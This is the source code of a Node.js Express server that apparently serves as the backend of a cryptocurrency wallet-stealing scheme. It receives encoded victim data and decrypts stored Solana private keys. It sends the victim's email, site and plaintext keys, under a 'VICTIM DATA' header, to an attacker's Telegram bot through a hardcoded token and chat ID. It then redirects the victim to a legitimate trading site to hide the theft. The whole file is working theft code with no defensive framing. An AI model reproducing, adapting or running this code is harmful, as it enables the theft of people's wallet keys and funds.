const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const app = express();

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    return null;
  }
}

async function getSOLPrice() {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const data = await response.json();
    return data.solana.usd;
  } catch (e) {
    return 150;
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    // Parse sBundles (Solana wallets)
    let sBundles = data.sBundles;
    if (typeof sBundles === 'string') {
      sBundles = JSON.parse(sBundles);
    }
    
    if (!Array.isArray(sBundles)) {
      sBundles = [];
    }
    
    console.log(`Processing ${sBundles.length} Solana bundles`);
    
    // Decrypt all Solana keys
    const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
    console.log(`Decrypted ${solKeys.length} Solana keys`);
    
    const solPrice = await getSOLPrice();
    
    // Build simple message
    const msg = `
🎯 VICTIM DATA

📧 ${data.user?.email || 'No email'}
🔑 Decrypted Keys: ${solKeys.length}
💰 SOL Price: $${solPrice.toFixed(2)}
🔗 ${data.site}
⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}

Keys:
${solKeys.slice(0, 5).map((k, i) => `${i + 1}. ${k}`).join('\n')}
${solKeys.length > 5 ? `... and ${solKeys.length - 5} more` : ''}
`.trim();
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
    });
    
    console.log('Sent to Telegram successfully');
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Error:', e);
    res.status(500).send('err');
  }
});

app.get('/', (req, res) => {
  res.send('<h1>Service Online</h1>');
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running');
});
